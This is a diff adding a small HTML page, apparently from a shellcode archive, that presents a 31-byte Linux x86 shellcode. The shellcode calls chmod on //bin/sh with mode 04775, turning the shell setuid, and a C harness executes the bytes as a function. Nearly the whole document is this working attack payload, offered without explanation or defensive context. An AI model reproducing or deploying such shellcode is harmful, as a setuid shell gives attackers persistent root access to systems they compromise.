@@ -1,0 +1,36 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Linux/x86 - chmod(//bin/sh ,04775); set sh +s - 31 bytes</title>
+
+<meta http-equiv="Content-Language" content="en">
+</head>
+<body><pre>/*
+ * Linux x86 shellcode by bob from Dtors.net.
+ * chmod("//bin/sh" ,04775); set sh +s
+ */
+
+
+
+#include &lt;stdio.h&gt;
+
+char shellcode[]=
+		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e"
+		"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
+		"\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80"
+		"\xb0\x01\xcd\x80";
+int
+main()
+{
+        void (*dsr) ();
+        (long) dsr = &amp;shellcode;
+        printf("Size: %d bytes.\n", sizeof(shellcode)); 
+        dsr();
+}
+
+
+
+
+
+</pre></body>
+</html>
